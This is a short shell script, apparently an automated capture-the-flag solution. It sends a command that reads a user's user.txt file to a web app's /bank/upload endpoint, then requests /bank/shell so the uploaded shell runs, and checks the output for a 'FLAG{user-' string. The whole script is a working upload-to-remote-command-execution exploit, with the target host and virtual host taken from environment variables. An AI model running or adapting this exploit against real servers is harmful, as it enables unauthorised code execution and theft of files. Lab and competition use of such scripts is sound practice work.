set -eu
u="${BOX_U:?BOX_U is not set}"
printf 'cat /home/%s/user.txt\n' "$u" | curl -fsS -H "Host: ${BOX_VHOST}" --data-binary @- "http://${BOX_HOST}:8088/bank/upload" >/dev/null
out=$(curl -fsS -H "Host: ${BOX_VHOST}" "http://${BOX_HOST}:8088/bank/shell")
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "uploaded shell did not execute" >&2; exit 1; }
